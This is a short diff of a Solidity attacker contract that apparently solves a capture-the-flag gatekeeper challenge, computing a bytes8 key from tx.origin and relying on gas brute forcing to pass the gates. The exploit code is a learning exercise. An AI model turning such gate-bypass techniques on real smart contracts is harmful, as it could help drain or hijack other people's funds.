@@ -17,8 +17,10 @@ contract Attacker {
   function attack() public {
     // gateOne = send the tx from another contract
     // gateTwo = gasleft() % 8191 == 0
-    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first byte as a 10 instead of 00 to overflow the unint32 and uint16.
-    challenge.enter(0x100000000000CDF1);
+    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first four bits as a 1 instead of 0 to overflow the unint32 and uint16.
+    uint16 addressToInt = uint16(uint160(tx.origin));
+    bytes8 key = bytes8(uint64(addressToInt + 2**60));
+    challenge.enter(key); // must brute force this
   }
 
 }
